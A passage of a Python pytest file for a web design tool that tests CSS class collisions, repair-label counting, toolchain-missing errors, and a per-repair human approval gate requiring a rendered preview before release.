        build_fragment_render_package,
        fragment_class_collisions,
    )

    broken = _mint_broken(workspace_id, design_storage)
    registry = _registry(workspace_id, design_storage, tmp_path / "cache")
    repair = registry.mint_repair(
        replaces=broken["fragment_id"], html=REPAIR_HTML, css=REPAIR_CSS, rung=3, note="fallback"
    )
    web_doc = {
        "pages": [
            {
                "id": "home",
                "root": "root",
                "nodes": {
                    "root": {"id": "root", "kind": "container", "children": ["a", "b"]},
                    "a": {"id": "a", "kind": "fragment", "fragment_id": repair["fragment_id"]},
                    "b": {"id": "b", "kind": "fragment", "fragment_id": broken["fragment_id"]},
                },
            }
        ]
    }
    package = build_fragment_render_package(
        design_storage, workspace_id=workspace_id, web_doc=web_doc, page_id="home"
    )

    # The fact the report reads, stamped where the row is.
    assert package["fragments"][repair["fragment_id"]]["derived"] is True
    assert package["fragments"][broken["fragment_id"]]["derived"] is False

    # Both sheets declare `.text-3xl` / `.head`; the document authors both as utilities.
    collisions = dict(
        fragment_class_collisions(
            package,
            [repair["fragment_id"], broken["fragment_id"]],
            {"text-3xl", "text-primary", "head", "proof"},
        )
    )
    assert repair["fragment_id"] not in collisions
    # ...and the harvested clone is still reported, so the diagnostic is narrowed, not retired.
    assert sorted(collisions[broken["fragment_id"]]) == ["head", "proof"]


def test_the_static_css_toolchain_refuses_by_name_when_it_is_not_installed(
    monkeypatch,
) -> None:
    """Ruling R-I3: "no compiler here" is a different sentence from "the compile failed"."""
    from lumen_api import web_export

    monkeypatch.setattr(web_export.shutil, "which", lambda _name: None)
    with pytest.raises(web_export.WebExportToolchainMissing) as missing:
        web_export.require_static_css_toolchain("node")
    assert "node on PATH" in str(missing.value)
    # Still a compile error to any caller that only knows the old class.
    assert isinstance(missing.value, web_export.WebExportCompileError)

    monkeypatch.setattr(web_export.shutil, "which", lambda _name: "/usr/bin/node")
    monkeypatch.setattr(web_export, "STATIC_CSS_SCRIPT", "scripts/does_not_exist.mjs")
    with pytest.raises(web_export.WebExportToolchainMissing) as gone:
        web_export.require_static_css_toolchain("node")
    assert "script is missing" in str(gone.value)

    # And the section compile is bounded far tighter than the export's own.
    assert web_export.SECTION_CSS_TIMEOUT_SECONDS < 120


# --------------------------------------------------------------------------- #
# F3.4 — the repair label counts instead of stacking
# --------------------------------------------------------------------------- #


@pytest.mark.parametrize(
    "original_label, expected",
    [
        ("Hero — Care, on your terms", "Repaired — Hero — Care, on your terms"),
        ("Repaired — Hero — Care, on your terms", "Repaired ×2 — Hero — Care, on your terms"),
        ("Repaired ×2 — Hero — Care, on your terms", "Repaired ×3 — Hero — Care, on your terms"),
        ("Repaired ×9 — Hero — Care", "Repaired ×10 — Hero — Care"),
        # A label that merely STARTS with the word is not a marker.
        ("Repairs — Hero", "Repaired — Repairs — Hero"),
    ],
)
def test_a_repair_of_a_repair_counts_rather_than_stacking_the_prefix(
    original_label: str, expected: str
) -> None:
    """Ledger T17-M6. Three rounds of repair produced "Repaired — Repaired — Repaired — Hero — …",
    a picker row that is mostly bookkeeping — and bookkeeping the LINEAGE already carries exactly,
    where this could only approximate it."""
    from lumen_api.agent_cloned_sections import _repair_label

    assert _repair_label({"label": original_label}) == expected


def test_a_repair_of_a_clone_with_no_label_falls_back_to_its_role() -> None:
    from lumen_api.agent_cloned_sections import _repair_label

    assert _repair_label({"section_role": "hero"}) == "Repaired — hero"


# --------------------------------------------------------------------------- #
# Releasing ONE repair (F4.4, FOUNDER RULING R-X9)
# --------------------------------------------------------------------------- #
#
# The founder's words, 2026-08-29: "require individual approval for each repair. Brand-kit
# approval should not silently approve later repairs. … do not add approval gates to our UI.
# Just ask for approval via chat only. First of all you need to explain."
#
# The kit cascade no longer moves a repair (that half is pinned in
# ``test_web_fragment_lifecycle.py``), which leaves the release surface below. It is a gate, not
# a decision: it enacts an answer a human gave in a conversation.


def _released(workspace_id: str, storage: FsStorage, registry, minted: dict) -> dict:
    from lumen_api.fragments import ISOLATION_RENDER_BASIS, attach_web_fragment_preview

    attach_web_fragment_preview(
        storage,
        workspace_id=workspace_id,
        fragment_id=minted["fragment_id"],
        preview=PNG,
        preview_basis=ISOLATION_RENDER_BASIS,
    )
    return registry.release_repair(minted["fragment_id"])


def test_releasing_one_repair_moves_exactly_that_row(
    workspace_id: str, design_storage: FsStorage, tmp_path
) -> None:
    """R-X9's whole affirmative case: ONE draft repair, with a picture, becomes approved."""
    broken = _mint_broken(workspace_id, design_storage)
    other = _mint_other_band(workspace_id, design_storage)
    registry = _registry(workspace_id, design_storage, tmp_path / "cache")
    minted = registry.mint_repair(
        replaces=broken["fragment_id"], html=REPAIR_HTML, css=REPAIR_CSS, rung=3, note="fallback"
    )

    released = _released(workspace_id, design_storage, registry, minted)

    assert released["status"] == "approved"
    assert released["derived_from"] == broken["fragment_id"]
    assert _fragment(workspace_id, minted["fragment_id"])["status"] == "approved"
    # Exactly that row: the original it replaces and an unrelated band are untouched.
    assert _fragment(workspace_id, broken["fragment_id"])["status"] == "approved"
    assert _fragment(workspace_id, broken["fragment_id"])["degraded"] is True
    assert _fragment(workspace_id, other["fragment_id"])["status"] == "approved"
    # And it is now pinnable, which is the only thing releasing it was for.
    assert registry.resolve_insertable(minted["fragment_id"])["fragment_id"] == (
        minted["fragment_id"]
    )


def test_a_second_draft_repair_is_not_carried_along_by_the_first_release(
    workspace_id: str, design_storage: FsStorage, tmp_path
) -> None:
    """"Individual approval for EACH repair" — one release is one repair, never a sweep."""
    broken = _mint_broken(workspace_id, design_storage)
    registry = _registry(workspace_id, design_storage, tmp_path / "cache")
    first = registry.mint_repair(
        replaces=broken["fragment_id"], html=REPAIR_HTML, css=REPAIR_CSS, rung=3, note="one"
    )
    second = registry.mint_repair(
        replaces=broken["fragment_id"],
        html=REPAIR_HTML.replace("Trusted by 400 clinics", "Trusted by 400 practices"),
        css=REPAIR_CSS,
        rung=2,
        note="two",
    )

    _released(workspace_id, design_storage, registry, first)

    assert _fragment(workspace_id, first["fragment_id"])["status"] == "approved"
    assert _fragment(workspace_id, second["fragment_id"])["status"] == "draft"


def test_releasing_a_harvested_original_is_refused_by_name(
    workspace_id: str, design_storage: FsStorage, tmp_path
) -> None:
    """A section with no lineage keeps the release law it already has (the kit approval). A
    second, quieter door onto it would make the narrower rule optional."""
    broken = _mint_broken(workspace_id, design_storage, approved=False)
    registry = _registry(workspace_id, design_storage, tmp_path / "cache")

    with pytest.raises(FragmentRefused) as excinfo:
        registry.release_repair(broken["fragment_id"])

    assert excinfo.value.code == "repair.not_a_repair"
    assert "brand kit" in str(excinfo.value)
    assert _fragment(workspace_id, broken["fragment_id"])["status"] == "draft"


def test_releasing_an_already_released_repair_is_refused_rather_than_a_silent_no_op(
    workspace_id: str, design_storage: FsStorage, tmp_path
) -> None:
    broken = _mint_broken(workspace_id, design_storage)
    registry = _registry(workspace_id, design_storage, tmp_path / "cache")
    minted = registry.mint_repair(
        replaces=broken["fragment_id"], html=REPAIR_HTML, css=REPAIR_CSS, rung=3, note="fallback"
    )
    _released(workspace_id, design_storage, registry, minted)

    with pytest.raises(FragmentRefused) as excinfo:
        registry.release_repair(minted["fragment_id"])

    assert excinfo.value.code == "repair.not_releasable"
    assert "already released" in str(excinfo.value)


def test_releasing_a_retired_repair_is_refused_rather_than_overruling_the_retirement(
    workspace_id: str, design_storage: FsStorage, tmp_path
) -> None:
    broken = _mint_broken(workspace_id, design_storage)
    registry = _registry(workspace_id, design_storage, tmp_path / "cache")
    minted = registry.mint_repair(
        replaces=broken["fragment_id"], html=REPAIR_HTML, css=REPAIR_CSS, rung=3, note="fallback"
    )
    set_web_fragment_status(
        workspace_id=workspace_id, fragment_id=minted["fragment_id"], status="deprecated"
    )

    with pytest.raises(FragmentRefused) as excinfo:
        registry.release_repair(minted["fragment_id"])

    assert excinfo.value.code == "repair.not_releasable"
    assert _fragment(workspace_id, minted["fragment_id"])["status"] == "deprecated"


def test_a_repair_nobody_can_look_at_is_refused(
    workspace_id: str, design_storage: FsStorage, tmp_path
) -> None:
    """R-X9's "first of all you need to explain", made structural: a fresh repair is minted with
    no preview (nothing ever photographed it), so approving it would be approving a section
    nobody can see. The refusal names the remedy rather than merely reporting the gap."""
    broken = _mint_broken(workspace_id, design_storage)
    registry = _registry(workspace_id, design_storage, tmp_path / "cache")
    minted = registry.mint_repair(
        replaces=broken["fragment_id"], html=REPAIR_HTML, css=REPAIR_CSS, rung=3, note="fallback"
    )
    assert _fragment(workspace_id, minted["fragment_id"])["preview_digest"] is None

    with pytest.raises(FragmentRefused) as excinfo:
        registry.release_repair(minted["fragment_id"])

    assert excinfo.value.code == "repair.no_preview"
    assert "render one first" in str(excinfo.value).lower()
    assert _fragment(workspace_id, minted["fragment_id"])["status"] == "draft"


def test_releasing_a_fragment_this_workspace_does_not_hold_is_refused(
    workspace_id: str, design_storage: FsStorage, tmp_path
) -> None:
    registry = _registry(workspace_id, design_storage, tmp_path / "cache")

    with pytest.raises(FragmentRefused) as excinfo:
        registry.release_repair("frag_" + "0" * 16)

    assert excinfo.value.code == "fragment.unresolved"


def test_rendering_a_repairs_preview_makes_the_evidence_the_release_gate_asks_for(
    workspace_id: str, design_storage: FsStorage, tmp_path
) -> None:
    """The other half of R-X9's "first of all you need to explain": the picture has to be
    MAKEABLE from where the asking happens, or the gate above is a dead end.

    The browser half is injected (F3.4's rule — a test that rebinds a module attribute to avoid
    launching Chromium stops exercising the seam it was written for), so what this pins is the
    F3.2 machinery being reached, the P-7 basis landing on the row, and the refusal turning into
    a release.
    """
    from lumen_api.fragments import ISOLATION_RENDER_BASIS

    class _FakeCore:
        """The engine half. What it renders is `test_web_fragment_render.py`'s business; what
        matters here is that the isolation page is built from the repair's OWN artifact."""

        def web_render(self, doc, page_id, **kwargs):
            from lumen_api.fragments import fragment_wrapper_class

            fragment_id = next(iter(kwargs.get("fragments") or {}), "frag_unknown")
            body = (
                f'<div class="{fragment_wrapper_class(fragment_id)}">'
                f"{kwargs['fragments'][fragment_id]['html']}</div>"
            )
            return {"html": f"<!doctype html><html><body>{body}</body></html>", "diagnostics": []}

    broken = _mint_broken(workspace_id, design_storage)
    registry = _registry(workspace_id, design_storage, tmp_path / "cache")
    minted = registry.mint_repair(
        replaces=broken["fragment_id"], html=REPAIR_HTML, css=REPAIR_CSS, rung=3, note="fallback"
    )
    with pytest.raises(FragmentRefused) as before:
        registry.release_repair(minted["fragment_id"])
    assert before.value.code == "repair.no_preview"

    digest = registry.render_repair_preview(
        minted["fragment_id"], _FakeCore(), shoot=lambda page, assets: PNG
    )

    row = _fragment(workspace_id, minted["fragment_id"])
    assert row["preview_digest"] == digest
    # P-7's labelling clause: our own render never passes for a crop of the client's site.
    assert row["preview_basis"] == ISOLATION_RENDER_BASIS
    # Attached ONCE, never replaced — a decision is made against the picture that is there.
    assert registry.render_repair_preview(
        minted["fragment_id"], _FakeCore(), shoot=lambda page, assets: b"different"
    ) is None
    assert _fragment(workspace_id, minted["fragment_id"])["preview_digest"] == digest

    released = registry.release_repair(minted["fragment_id"])
    assert released["status"] == "approved"
